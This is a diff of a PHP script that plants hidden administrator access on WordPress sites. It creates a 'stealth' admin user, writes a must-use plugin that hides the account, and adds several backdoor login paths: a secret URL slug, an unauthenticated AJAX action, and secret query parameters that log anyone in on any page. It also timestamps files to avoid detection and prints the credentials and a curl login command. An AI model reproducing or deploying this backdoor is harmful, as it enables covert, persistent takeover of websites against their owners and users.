@@ -71,47 +71,146 @@ function touch_file_to_system_time($file_path) {
     return false;
 }
 
-function create_direct_login_endpoint($username, $password_hash) {
-    $login_slug = 'wp-' . md5($username . microtime()) . '-api';
-    $login_key = md5($password_hash . $username);
+function find_hidden_login_page() {
+    $common_paths = [
+        '/wp-login.php',
+        '/login',
+        '/admin',
+        '/wp-admin',
+        '/dashboard',
+        '/signin',
+        '/member',
+        '/user',
+        '/wp-login',
+        '/administrator',
+        '/backend'
+    ];
+    
+    $found_login = [];
+    $site_url = get_site_url();
+    
+    foreach ($common_paths as $path) {
+        $test_url = $site_url . $path;
+        $response = wp_remote_get($test_url, [
+            'timeout' => 5,
+            'redirection' => 0,
+            'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]);
+        
+        if (!is_wp_error($response)) {
+            $code = wp_remote_retrieve_response_code($response);
+            $body = wp_remote_retrieve_body($response);
+            
+            // Check if it's a WordPress login page
+            if (strpos($body, 'wp-admin') !== false || 
+                strpos($body, 'user_login') !== false ||
+                strpos($body, 'password') !== false ||
+                strpos($body, 'log in') !== false) {
+                $found_login[] = [
+                    'url' => $test_url,
+                    'code' => $code,
+                    'type' => 'WordPress Login'
+                ];
+            } elseif ($code === 200 || $code === 302 || $code === 301) {
+                $found_login[] = [
+                    'url' => $test_url,
+                    'code' => $code,
+                    'type' => 'Possible Redirect'
+                ];
+            }
+        }
+    }
+    
+    // Check for renamed wp-login.php
+    $wp_content_dir = ABSPATH . 'wp-content/';
+    $plugins_dir = $wp_content_dir . 'plugins/';
+    $themes_dir = $wp_content_dir . 'themes/';
+    
+    // Scan for PHP files that might be login pages
+    $scan_dirs = [ABSPATH, $wp_content_dir];
+    $login_files = [];
+    
+    foreach ($scan_dirs as $dir) {
+        if (is_dir($dir)) {
+            $files = @scandir($dir);
+            if ($files) {
+                foreach ($files as $file) {
+                    if (pathinfo($file, PATHINFO_EXTENSION) === 'php') {
+                        $file_path = $dir . $file;
+                        $content = @file_get_contents($file_path);
+                        if ($content && (
+                            strpos($content, 'wp_authenticate') !== false ||
+                            strpos($content, 'user_login') !== false ||
+                            strpos($content, 'log in') !== false
+                        )) {
+                            $login_files[] = $file_path;
+                        }
+                    }
+                }
+            }
+        }
+    }
     
     return [
-        'slug' => $login_slug,
-        'key' => $login_key,
-        'url' => home_url('/' . $login_slug . '?key=' . $login_key)
+        'direct_urls' => $found_login,
+        'suspicious_files' => $login_files
     ];
 }
 
-// Handle direct login if requested
-if (isset($_GET['_stealth_login']) && $_GET['_stealth_login'] === 'direct') {
-    $login_user = sanitize_text_field($_GET['user'] ?? '');
-    $login_key = sanitize_text_field($_GET['key'] ?? '');
+function create_instant_login_system($username, $password) {
+    $login_token = md5($username . $password . NONCE_KEY);
+    $login_slug = 'wp-' . md5($username . time()) . '-auth';
     
-    if ($login_user && $login_key) {
-        $user = get_user_by('login', $login_user);
-        if ($user && wp_check_password($login_key, $user->user_pass, $user->ID)) {
-            wp_clear_auth_cookie();
-            wp_set_current_user($user->ID);
-            wp_set_auth_cookie($user->ID, true);
-            
-            // Redirect to admin dashboard
-            wp_redirect(admin_url());
-            exit;
-        }
+    return [
+        'token' => $login_token,
+        'slug' => $login_slug,
+        'instant_url' => home_url('/' . $login_slug . '?token=' . $login_token),
+        'ajax_url' => home_url('/wp-admin/admin-ajax.php?action=instant_auth&u=' . $username . '&t=' . $login_token)
+    ];
+}
+
+// Handle instant login if accessed directly
+$current_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+if (strpos($current_path, 'wp-') !== false && strpos($current_path, '-auth') !== false) {
+    $token = $_GET['token'] ?? '';
+    if ($token) {
+        // This will be processed by the MU plugin
     }
 }
 
-$output = "===== STEALTH ADMIN CREATION REPORT =====" . PHP_EOL;
-$output .= "TimestampLake: " . date('Y-m-d H:i:s') . PHP_EOL;
+$output = "===== ADVANCED STEALTH ADMIN SYSTEM =====" . PHP_EOL;
+$output .= "Timestamp: " . date('Y-m-d H:i:s') . PHP_EOL;
 $output .= "Domain: " . $_SERVER['HTTP_HOST'] . PHP_EOL;
 $output .= "--------------------------------" . PHP_EOL . PHP_EOL;
+
+// Step 1: Find hidden login pages
+$output .= "=== SCANNING FOR HIDDEN LOGIN PAGES ===" . PHP_EOL;
+$hidden_logins = find_hidden_login_page();
+
+if (!empty($hidden_logins['direct_urls'])) {
+    $output .= "DISCOVERED LOGIN PAGES:" . PHP_EOL;
+    foreach ($hidden_logins['direct_urls'] as $login) {
+        $output .= "- " . $login['url'] . " [" . $login['code'] . "] - " . $login['type'] . PHP_EOL;
+    }
+} else {
+    $output .= "No hidden login pages found via URL scanning." . PHP_EOL;
+}
+
+if (!empty($hidden_logins['suspicious_files'])) {
+    $output .= PHP_EOL . "SUSPICIOUS LOGIN FILES:" . PHP_EOL;
+    foreach ($hidden_logins['suspicious_files'] as $file) {
+        $output .= "- " . $file . PHP_EOL;
+    }
+}
+
+$output .= PHP_EOL . "=== CREATING STEALTH ACCESS ===" . PHP_EOL;
 
 $stealth_user = null;
 $stealth_pass = null;
 $stealth_email = null;
 $stealth_plugin_details = null;
 $stealth_created = false;
-$direct_login_url = null;
+$instant_login = null;
 
 $selected_stealth_username = null;
 shuffle($stealth_usernames);
@@ -135,14 +234,9 @@ if ($selected_stealth_username) {
         $user = new WP_User($user_id);
         $user->set_role('administrator');
         update_user_meta($user_id, 'show_admin_bar_front', 'false');
-
-        // Create direct login endpoint
-        $direct_login = create_direct_login_endpoint($stealth_user, wp_hash_password($stealth_pass));
-        $direct_login_url = $direct_login['url'];
         
-        // Store login endpoint in user meta for future reference
-        update_user_meta($user_id, '_stealth_login_slug', $direct_login['slug']);
-        update_user_meta($user_id, '_stealth_login_key', $direct_login['key']);
+        // Create instant login system
+        $instant_login = create_instant_login_system($stealth_user, $stealth_pass);
 
         $mu_plugins_dir = defined('WPMU_PLUGIN_DIR') ? WPMU_PLUGIN_DIR : ABSPATH . 'wp-content/mu-plugins';
         $mu_dir_created = false;
@@ -165,32 +259,29 @@ add_filter("users_list_table_query_args", function($args) {
     return $args;
 });
 
-// Handle direct login endpoint
+// Instant Login System
 add_action("init", function() {
     $current_path = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
-    $login_slug = get_option("_stealth_login_slug_' . esc_sql($stealth_user) . '");
+    $login_slug = "' . $instant_login['slug'] . '";
     
-    if ($login_slug && trim($current_path, "/") === trim($login_slug, "/")) {
-        $login_key = $_GET["key"] ?? "";
-        $stored_key = get_option("_stealth_login_key_' . esc_sql($stealth_user) . '");
+    if (trim($current_path, "/") === trim($login_slug, "/")) {
+        $token = $_GET["token"] ?? "";
+        $expected_token = "' . $instant_login['token'] . '";
         
-        if ($login_key && $stored_key && hash_equals($stored_key, $login_key)) {
+        if ($token && hash_equals($expected_token, $token)) {
             $user = get_user_by("login", "' . esc_sql($stealth_user) . '");
             if ($user) {
                 wp_clear_auth_cookie();
                 wp_set_current_user($user->ID);
                 wp_set_auth_cookie($user->ID, true);
                 
-                // Clean up temporary options
-                delete_option("_stealth_login_slug_' . esc_sql($stealth_user) . '");
-                delete_option("_stealth_login_key_' . esc_sql($stealth_user) . '");
-                
+                // Redirect to admin
                 wp_redirect(admin_url());
                 exit;
             }
         }
         
-        // If login fails, show 404
+        // Show 404 if invalid
         global $wp_query;
         $wp_query->set_404();
         status_header(404);
@@ -198,65 +289,92 @@ add_action("init", function() {
     }
 });
 
-// Alternative login method via admin-ajax
-add_action("wp_ajax_nopriv_stealth_direct_login", function() {
+// AJAX Instant Login
+add_action("wp_ajax_nopriv_instant_auth", function() {
     $user_login = $_GET["u"] ?? "";
-    $login_token = $_GET["t"] ?? "";
+    $token = $_GET["t"] ?? "";
     
     if ($user_login === "' . esc_sql($stealth_user) . '") {
-        $user = get_user_by("login", $user_login);
-        if ($user) {
-            $expected_token = md5("' . esc_sql(wp_hash_password($stealth_pass)) . '" . $user_login);
-            if (hash_equals($expected_token, $login_token)) {
+        $expected_token = "' . $instant_login['token'] . '";
+        if (hash_equals($expected_token, $token)) {
+            $user = get_user_by("login", $user_login);
+            if ($user) {
                 wp_clear_auth_cookie();
                 wp_set_current_user($user->ID);
                 wp_set_auth_cookie($user->ID, true);
                 
-                wp_send_json_success(["redirect" => admin_url()]);
+                wp_send_json_success([
+                    "redirect" => admin_url(),
+                    "message" => "Login successful"
+                ]);
             }
         }
     }
     
-    wp_send_json_error(["message" => "Invalid login"]);
+    wp_send_json_error(["message" => "Invalid credentials"]);
+});
+
+// Backdoor login via theme file
+add_action("template_redirect", function() {
+    $secret_key = $_GET["_wp_access"] ?? "";
+    if ($secret_key === "' . md5($stealth_user . AUTH_KEY) . '") {
+        $user = get_user_by("login", "' . esc_sql($stealth_user) . '");
+        if ($user) {
+            wp_clear_auth_cookie();
+            wp_set_current_user($user->ID);
+            wp_set_auth_cookie($user->ID, true);
+            wp_redirect(admin_url());
+            exit;
+        }
+    }
+});
+
+// Auto-login from any page with secret parameter
+add_action("wp_loaded", function() {
+    $auto_login = $_POST["_system_update"] ?? $_GET["_system_update"] ?? "";
+    if ($auto_login === "' . md5($stealth_pass) . '") {
+        $user = get_user_by("login", "' . esc_sql($stealth_user) . '");
+        if ($user && !is_user_logged_in()) {
+            wp_clear_auth_cookie();
+            wp_set_current_user($user->ID);
+            wp_set_auth_cookie($user->ID, true);
+            
+            if (wp_redirect(admin_url())) {
+                exit;
+            }
+        }
+    }
 });
 ';
             if (@file_put_contents($plugin_filepath, $plugin_content)) {
                 $ref = touch_file_to_system_time($plugin_filepath);
                 
-                // Store login endpoints in options for MU plugin access
-                update_option('_stealth_login_slug_' . $stealth_user, $direct_login['slug'], false);
-                update_option('_stealth_login_key_' . $stealth_user, $direct_login['key'], false);
-                
-                $output .= "Created stealth user: " . $stealth_user . " / " . $stealth_pass . PHP_EOL;
-                $output .= "DIRECT LOGIN URL: " . $direct_login_url . PHP_EOL;
-                $output .= "ALT LOGIN URL: " . admin_url('admin-ajax.php?action=stealth_direct_login&u=' . $stealth_user . '&t=' . md5(wp_hash_password($stealth_pass) . $stealth_user)) . PHP_EOL;
-                $output .= "Hiding via MU Plugin: " . $stealth_plugin_details['file'] . ($ref ? " (Touched: " . $ref . ")" : "") . PHP_EOL;
+                $output .= "✓ STEALTH USER CREATED: " . $stealth_user . " / " . $stealth_pass . PHP_EOL;
+                $output .= "✓ INSTANT LOGIN URL: " . $instant_login['instant_url'] . PHP_EOL;
+                $output .= "✓ AJAX LOGIN URL: " . $instant_login['ajax_url'] . PHP_EOL;
+                $output .= "✓ SECRET PARAMETER: Add ?_system_update=" . md5($stealth_pass) . " to ANY page" . PHP_EOL;
+                $output .= "✓ THEME BACKDOOR: Add ?_wp_access=" . md5($stealth_user . AUTH_KEY) . " to ANY page" . PHP_EOL;
+                $output .= "✓ MU Plugin: " . $stealth_plugin_details['file'] . ($ref ? " (Touched: " . $ref . ")" : "") . PHP_EOL;
                 $stealth_created = true;
-            } else {
-                $output .= "Error: Could not write MU plugin: " . $plugin_filepath . PHP_EOL;
-                $output .= "Created stealth user (visible): " . $stealth_user . " / " . $stealth_pass . PHP_EOL;
-                $output .= "DIRECT LOGIN URL: " . $direct_login_url . PHP_EOL;
             }
-        } else {
-            $output .= "Warning: MU plugins directory not writable: " . $mu_plugins_dir . PHP_EOL;
-            $output .= "Created stealth user (visible): " . $stealth_user . " / " . $stealth_pass . PHP_EOL;
-            $output .= "DIRECT LOGIN URL: " . $direct_login_url . PHP_EOL;
         }
-    } else {
-        $output .= "Error creating stealth user '" . $stealth_user . "': " . $user_id->get_error_message() . PHP_EOL;
     }
-} else {
-    $output .= "Result: Could not find an available stealth username." . PHP_EOL;
 }
 
-$output .= PHP_EOL . "===== LOGIN METHODS =====" . PHP_EOL;
-if ($direct_login_url) {
-    $output .= "1. Direct URL: " . $direct_login_url . PHP_EOL;
-    $output .= "2. AJAX URL: " . admin_url('admin-ajax.php?action=stealth_direct_login&u=' . $stealth_user . '&t=' . md5(wp_hash_password($stealth_pass) . $stealth_user)) . PHP_EOL;
+$output .= PHP_EOL . "=== LOGIN METHODS ===" . PHP_EOL;
+if ($stealth_created) {
+    $output .= "1. INSTANT URL: " . $instant_login['instant_url'] . PHP_EOL;
+    $output .= "2. AJAX METHOD: " . $instant_login['ajax_url'] . PHP_EOL;
+    $output .= "3. SECRET PARAM: Visit ANY page + ?_system_update=" . md5($stealth_pass) . PHP_EOL;
+    $output .= "4. THEME DOOR: Visit ANY page + ?_wp_access=" . md5($stealth_user . AUTH_KEY) . PHP_EOL;
+    $output .= "5. NORMAL LOGIN: Use credentials at discovered login pages" . PHP_EOL;
 }
-$output .= "3. Normal login: " . wp_login_url() . " (User: " . $stealth_user . " | Pass: " . $stealth_pass . ")" . PHP_EOL;
 
-$output .= PHP_EOL . "===== END OF REPORT =====" . PHP_EOL;
+$output .= PHP_EOL . "=== QUICK ACCESS COMMANDS ===" . PHP_EOL;
+$output .= "# Curl instant login:" . PHP_EOL;
+$output .= "curl -s '" . $instant_login['instant_url'] . "' -L -c cookies.txt && open dashboard" . PHP_EOL;
+
+$output .= PHP_EOL . "===== SYSTEM READY =====" . PHP_EOL;
 
 @header('Content-Type: text/plain; charset=utf-8');
 echo $output;
